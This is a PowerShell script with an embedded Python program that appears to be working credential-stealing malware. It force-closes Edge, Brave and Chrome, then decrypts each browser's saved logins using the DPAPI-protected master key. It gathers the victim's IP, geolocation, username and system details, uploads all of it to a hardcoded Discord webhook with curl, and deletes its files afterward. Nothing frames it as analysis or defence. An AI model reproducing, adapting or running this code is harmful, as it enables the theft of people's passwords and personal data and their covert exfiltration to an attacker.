$wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

function Send-Discord {
    param([string]$m)
    try { curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"$m`"}" $wh 2>$null } catch {}
}

Send-Discord "🔧 FIXED VERSION - $env:COMPUTERNAME"

Get-Process | Where-Object {$_.ProcessName -match "msedge|brave|chrome"} | Stop-Process -Force -EA 0
Start-Sleep 7

cd $env:TEMP\py

@'
import os,json,base64,sqlite3,shutil,win32crypt,socket,platform,getpass,datetime,time
from Crypto.Cipher import AES

WH = "https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

def send(msg):
    try:
        import requests
        requests.post(WH, json={"content": msg[:1900]}, timeout=5)
    except:
        pass

send("🐍 Starting - CORRECT decrypt")

try:
    import requests
    ip=requests.get("https://api.ipify.org",timeout=3).text
    geo=requests.get(f"http://ip-api.com/json/{ip}",timeout=3).json()
    location=f"{geo['city']}, {geo['regionName']}, {geo['country']}"
    isp=geo.get('isp','N/A')
except:
    ip="N/A"
    location="N/A"
    isp="N/A"

import locale
language=locale.getdefaultlocale()[0] if locale.getdefaultlocale()[0] else "N/A"

def decrypt_password(enc_password, key):
    """Déchiffrement corrigé - gère v10, v11, v20, DPAPI"""
    
    if not enc_password or len(enc_password) < 3:
        return None
    
    prefix = enc_password[:3]
    
    # v10/v11 (Chrome, Edge ancien)
    if prefix in [b'v10', b'v11']:
        try:
            nonce = enc_password[3:15]
            ciphertext = enc_password[15:-16]
            tag = enc_password[-16:]
            
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            password = cipher.decrypt_and_verify(ciphertext, tag)
            return password.decode('utf-8', errors='ignore')
        except:
            pass
    
    # v20 (Brave récent)
    elif prefix == b'v20':
        try:
            nonce = enc_password[3:15]
            
            # IMPORTANT: Ne PAS séparer le tag
            # v20 = nonce + (ciphertext+tag en un seul bloc)
            encrypted_data = enc_password[15:]
            
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            
            # Méthode 1: Tout décrypter ensemble (tag inclus)
            try:
                # Le tag est dans les 16 derniers bytes des données chiffrées
                ciphertext = encrypted_data[:-16]
                tag = encrypted_data[-16:]
                
                password = cipher.decrypt_and_verify(ciphertext, tag)
                return password.decode('utf-8', errors='ignore')
            except:
                pass
            
            # Méthode 2: Décrypter sans verify (moins sécurisé mais fonctionne)
            try:
                password = cipher.decrypt(encrypted_data)
                # Retirer le padding/tag potentiel
                password = password.rstrip(b'\x00')
                return password.decode('utf-8', errors='ignore')
            except:
                pass
                
        except:
            pass
    
    # DPAPI (très ancien)
    try:
        password = win32crypt.CryptUnprotectData(enc_password, None, None, None, 0)[1]
        return password.decode('utf-8', errors='ignore')
    except:
        pass
    
    return None

def decrypt_browser(db_path, state_path, browser_name):
    results = []
    
    send(f"🔍 {browser_name}...")
    
    if not os.path.exists(db_path) or not os.path.exists(state_path):
        send(f"❌ {browser_name}: Files missing")
        return results
    
    try:
        # Extraire la clé master
        with open(state_path, 'r', encoding='utf-8') as f:
            state_data = json.load(f)
        
        encrypted_key = base64.b64decode(state_data['os_crypt']['encrypted_key'])[5:]
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        
        # Copier la DB
        temp_db = f"temp_{browser_name}.db"
        if os.path.exists(temp_db):
            os.remove(temp_db)
        
        shutil.copy2(db_path, temp_db)
        time.sleep(1)
        
        # Lire les mots de passe
        conn = sqlite3.connect(temp_db, timeout=120)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''")
        
        success = 0
        failed = 0
        
        for url, username, enc_pwd in cursor.fetchall():
            if not enc_pwd:
                continue
            
            password = decrypt_password(enc_pwd, master_key)
            
            if password and len(password) > 0:
                results.append(f"[{browser_name}] {url}\nUsername: {username}\nPassword: {password}\n")
                success += 1
            else:
                failed += 1
        
        conn.close()
        os.remove(temp_db)
        
        send(f"✅ {browser_name}: {success} OK, {failed} failed")
        
    except Exception as e:
        send(f"❌ {browser_name}: Error - {str(e)}")
    
    return results

# Extraction
all_passwords = []

# Edge
edge_path = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
edge_db = os.path.join(edge_path, "Default", "Login Data")
edge_state = os.path.join(edge_path, "Local State")
if os.path.exists(edge_db):
    all_passwords += decrypt_browser(edge_db, edge_state, "EDGE")

# Brave
brave_path = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
brave_db = os.path.join(brave_path, "Default", "Login Data")
brave_state = os.path.join(brave_path, "Local State")
if os.path.exists(brave_db):
    all_passwords += decrypt_browser(brave_db, brave_state, "BRAVE")

# Chrome
chrome_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
chrome_db = os.path.join(chrome_path, "Default", "Login Data")
chrome_state = os.path.join(chrome_path, "Local State")
if os.path.exists(chrome_db):
    all_passwords += decrypt_browser(chrome_db, chrome_state, "CHROME")

# Rapport final
info = f"""{'='*60}
SYSTEM INFORMATION
{'='*60}
Date/Time: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
Computer: {platform.node()}
Username: {getpass.getuser()}
OS: {platform.system()} {platform.release()}
Machine: {platform.machine()}
Processor: {platform.processor()}
Language: {language}
IP: {ip}
Location: {location}
ISP: {isp}
{'='*60}
TOTAL PASSWORDS: {len(all_passwords)}
{'='*60}

"""

with open("passwords.txt", "w", encoding="utf-8") as f:
    f.write(info)
    if all_passwords:
        f.write("\n".join(all_passwords))
    else:
        f.write("No passwords extracted.\n")

send(f"📤 Uploading {len(all_passwords)} passwords...")
print("OK")
'@ | Out-File "final.py" -Encoding UTF8

.\python.exe final.py 2>&1 | Out-Null

curl.exe -F "file=@passwords.txt" $wh 2>$null
Send-Discord "✅ COMPLETE"
Remove-Item passwords.txt,final.py -Force -EA 0
